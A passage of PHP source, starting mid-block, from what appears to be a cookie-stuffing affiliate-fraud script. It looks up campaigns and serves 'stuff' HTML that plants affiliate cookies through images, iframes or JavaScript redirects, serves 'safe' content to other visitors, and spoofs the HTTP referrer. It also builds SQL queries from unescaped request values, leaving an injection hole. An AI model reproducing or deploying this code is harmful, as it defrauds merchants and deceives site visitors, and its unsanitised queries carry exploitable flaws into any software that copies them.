if (!$in_md5) { if (db_get_data('url','scan_urls',$where,'itemid',$offset,$links)) { if ($db_num) { if (!$css_method) { setcookie('css_0',$db_num,0,'/'); } else { if ($x2===FALSE) { $x2=array(); } $x2[0]=$db_num; $x2=serialize($x2); db_update_data(array('md5'=>$x2),"ip='$ip'",'scan'); } $x=array(); while ($row = mysql_fetch_array($db_result,MYSQL_ASSOC)) { $x[]=$row['url']; } if (sizeof($x)) { $x=serialize($x); db_update_data(array('toscan'=>$x),"ip='$ip'",'scan'); a7log("scan, CSS method: echo 1"); echo "1"; exit; } } } } else if ($in_md5=='1') { if (db_get_data('itemid,url,campaignid','scan_urls',$where,'itemid',$offset,$links)) { if ($db_num) { a7log("scan: javascript method, number of URLs to scan=$db_num"); $out=''; while ($row = mysql_fetch_array($db_result,MYSQL_ASSOC)) { $out=$out . "{$row['url']}|{$row['campaignid']}|{$row['itemid']}||"; } db_update_data(array('offset'=>'+' . $links),"ip='$ip'",'scan'); a7log("scan: javascript method, output=$out"); echo $out; exit; } } } } } } } function gethtml($campaignid) { global $html_var_instructions,$advanced,$html_var_row,$db_num,$db_result; $html_var_row=array(); $ret=''; if (db_get_data('*','campaigns',"campaignid='$campaignid'")) { if ($db_num) { $html_var_row[0]=mysql_fetch_array($db_result,MYSQL_ASSOC); if ($html_var_row[0]['type']==0 || $html_var_row[0]['type']==3) { $advanced=unserialize($html_var_row[0]['advanced']); implementation_instructions(1); $x=str_replace('&lt;','<',$html_var_instructions); $x=str_replace('&gt;','>',$x); if ($html_var_row[0]['type']==2) { $find='javascript'; $find2='<textarea'; $find3='</textarea>'; $find4='>'; } else if ($html_var_row[0]['type']==3) { $find='classid'; $find2='<textarea'; $find3='</textarea>'; $find4='>'; } else if ($html_var_row[0]['type']==0) { $find='<img src="'; $find2='<img src="'; $find3='</span>'; $find4='>'; } if (strpos($x,$find)!==FALSE) { $pos=strpos($x,$find2); if ($pos!==FALSE) { if ($find2=='<img src="') { $pos2=strpos($x,$find4,$pos); if ($pos2!==FALSE) { $pos2++; $ret=substr($x,$pos,$pos2-$pos); } } else { $pos=$pos+strlen($find2); $pos=strpos($x,$find4,$pos); if ($pos!==FALSE) { $pos++; $pos2=strpos($x,$find3,$pos); if ($pos2!==FALSE) { $ret=substr($x,$pos,$pos2-$pos); } } } } } } } } return($ret); } $_ctype=-1; $xy=0; $subid=''; $ar=array('id','campaignid','go','xy','fc','subid','in_external','action','in_list','in_md5','in_period'); process($ar); if ($id==20) { a20(); exit; } else if ($id==700) { a700(); exit; } $readit=1; $t=strtolower($campaignid); $t=ord(substr($t,0,1)); if ($t>=ord('a') && $t<=ord('z')) { if (db_get_data('*','campaigns',"forumgfx='$campaignid'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $campaignid=$row['campaignid']; $readit=0; } } } $campaignid2=$campaignid; $real_referrer=$referrer; $x=strpos($referrer,'?'); if ($x!==FALSE) { $referrer=substr($referrer,0,$x); } if ($id==10) { a10(); } else if ($id==11 && $campaignid && isset($_GET['imagex'])) { a11(); } else if ($campaignid) { if ($readit) { if (db_get_data('*','campaigns',"campaignid='$campaignid'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $readit=0; } } } if (!$readit) { if (1) { $affurl_temp=$row['affiliateurl']; $_ctype=$row['type']; if (db_get_data('ref2','custom',"campaignid='$campaignid'")) { if ($db_num) { $x=strtolower($_SERVER['HTTP_REFERER']); while ($row_custom = mysql_fetch_array($db_result,MYSQL_ASSOC)) { if ($x==$row_custom['ref2']) { $_SERVER['HTTP_REFERER']=$row2['files'] . $campaignid . '.php'; } } } } $advanced=unserialize($row['advanced']); if ($advanced===FALSE) { $advanced=array(); } $oldcookie=array(); if (isset($advanced['browsercookiename']) && $advanced['browsercookiename']) { if (isset($_COOKIE[$advanced['browsercookiename']])) { $oldcookie[$advanced['browsercookiename']]=$_COOKIE[$advanced['browsercookiename']]; } } if ($row['affiliateurl']=='http://' || $row['affiliateurl']=='https://') { $row['affiliateurl']=''; } $row['stuff_click']=$row['stuff_imagedest']; $row['nostuff_click']=$row['nostuff_imagedest']; $row['safe_click']=$row['safe_imagedest']; if ($row['type']==2 && $row['mode']==2 && $advanced['redirecturl']) { if (!$row['stuff_html']) { $row['stuff_html']=get_default_html(); } else { $url=$advanced['redirecturl']; $min=$advanced['minseconds']; $row['stuff_html']=str_replace('{url}',$url,$row['stuff_html']); $row['stuff_html']=str_replace('{URL}',$url,$row['stuff_html']); $row['stuff_html']=str_replace('{DELAY}',sprintf("%01d",$min),$row['stuff_html']); $row['stuff_html']=str_replace('{delay}',sprintf("%01d",$min),$row['stuff_html']); } $x='<html><head><script type="text/javascript">parent.window.location.replace("' . $advanced['redirecturl'] . '");</script></head><body></body></html>'; $row['nostuff_html']=$x; $row['safe_html']=$x; } if ($id==1) { a1(); } else if ($id==2 || $id==3 || $id==4) { a2(); } else if ($id==5) { a5(); } else if ($id==6) { a6(); } else if ($id==7 || $id==8 || $id==9) { a7(); } } } db_close(); } ?>